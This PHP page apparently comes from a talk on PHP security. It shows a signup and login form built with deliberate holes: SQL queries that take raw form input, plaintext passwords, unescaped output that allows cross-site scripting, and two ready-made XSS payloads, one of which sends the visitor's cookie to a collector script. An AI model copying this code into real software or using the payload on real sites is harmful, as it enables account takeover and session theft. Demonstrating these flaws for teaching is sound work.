<?php

session_start();

if( isset($_POST['action']) ) {

	$db = new PDO('mysql:host=localhost;dbname=understanding', 'root', 'root');

	switch( $_POST['action'] ) {
		case 'join':
            if( $_POST['create_username'] == '' || $_POST['create_password'] == '' ) break;
			$sql = "INSERT INTO user (username, password, admin) VALUES ('{$_POST['create_username']}', '{$_POST['create_password']}', 0)";
			$db->exec($sql);
			break;
		case 'login':
			$sql = "SELECT * FROM user WHERE username='{$_POST['login_username']}' AND password='{$_POST['login_password']}' LIMIT 1";
			$results = $db->query($sql, PDO::FETCH_ASSOC);
			foreach( $results as $row ) {
				$user = $row;
			}
			
			break;
	}
}

?><html>
<head>
	<script src="../jquery-1.8.1.min.js" type="text/javascript"></script>
	<style>
        input { width: 100% }
		strong { color: red; }
	</style>
</head>
<body>

<?php if( isset($sql) ) : ?>
	<p>SQL run: <?php echo htmlspecialchars( $sql ) ?></p>
<?php endif; ?>

<?php if( isset($user) ) : ?>
	<p>Hello <?php echo $user['username'] ?>. You are <?php if( !$user['admin'] ) echo 'not' ?> an admin.</p>
<?php endif; ?>

<div style="width: 49%; float: left">
	<h2>Create Account</h2>
	<form action="index.php" method="post">
		<input type="hidden" name="action" value="join"/>
		<div>Username <?php echo htmlspecialchars('<input type="text" name="create_username" value="').'<strong>'.htmlspecialchars(@$_POST["create_username"]).'</strong>'.htmlspecialchars('"/>') ?></div>
        <div><input autocomplete="off" type="text" id="create_username" name="create_username" value="<?php echo @$_POST["create_username"] ?>"/></div>
		<div>Password <?php echo htmlspecialchars('<input type="text" name="create_password" value="').'<strong>'.htmlspecialchars(@$_POST["create_password"]).'</strong>'.htmlspecialchars('"/>') ?></div>
        <div><input autocomplete="off" type="text" name="create_password" value="<?php echo @$_POST["create_password"] ?>"/></div>
		<div><input type="submit"/></div>
	</form>
	<span onclick="$('#create_username').val('&quot;><script>alert(\'foo\')</script>');">1</span>
	<span onclick="$('#create_username').val('&quot;><script>var i=new Image();i.src=\'http://localhost/talks/understanding-php/collect.php?cookie=\'+document.cookie</script>');">2</span>
</div>

<div style="width: 49%; float: left">
	<h2>Login Account</h2>
	<form action="index.php" method="post">
		<input type="hidden" name="action" value="login"/>
		<div>Username <?php echo htmlspecialchars('<input type="text" name="login_username" value="').'<strong>'.htmlspecialchars(@$_POST["login_username"]).'</strong>'.htmlspecialchars('"/>') ?></div>
        <div><input autocomplete="off" type="text" name="login_username" value="<?php echo @$_POST["login_username"] ?>"/></div>
		<div>Password <?php echo htmlspecialchars('<input type="text" name="login_password" value="').'<strong>'.htmlspecialchars(@$_POST["login_password"]).'</strong>'.htmlspecialchars('"/>') ?></div>
        <div><input autocomplete="off" type="text" name="login_password" value="<?php echo @$_POST["login_password"] ?>"/></div>
		<div><input type="submit"/></div>
	</form>
</div>

<textarea cols="80" rows="5" style="margin-top:30px; width:100%; clear:both"></textarea>

</body>
</html>
